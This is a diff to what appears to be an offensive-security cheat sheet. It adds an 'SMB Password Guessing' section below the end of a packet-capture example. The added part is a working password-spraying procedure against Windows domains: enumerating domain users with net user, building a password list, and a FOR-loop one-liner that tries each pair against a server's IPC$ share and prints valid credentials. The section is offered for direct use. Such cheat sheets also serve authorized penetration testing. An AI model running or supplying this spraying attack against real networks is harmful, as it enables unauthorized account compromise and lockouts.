@@ -217,3 +217,22 @@ Packet drop count: 0
 Packets formatted: 60
 Formatted file:    RoseSecurity-pktmon.pcapng
 ```
+## SMB Password Guessing:
+
+Create list of domain users
+
+```
+C:\> net user /domain > users.txt
+```
+
+Create password list 
+
+```
+C:\> notepad pass.txt
+```
+
+Start spraying!
+
+```
+C:\> @FOR /F %p in (pass.txt) DO @FOR /F %n in (users.txt) DO @net use \\SERVERIP\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
+```
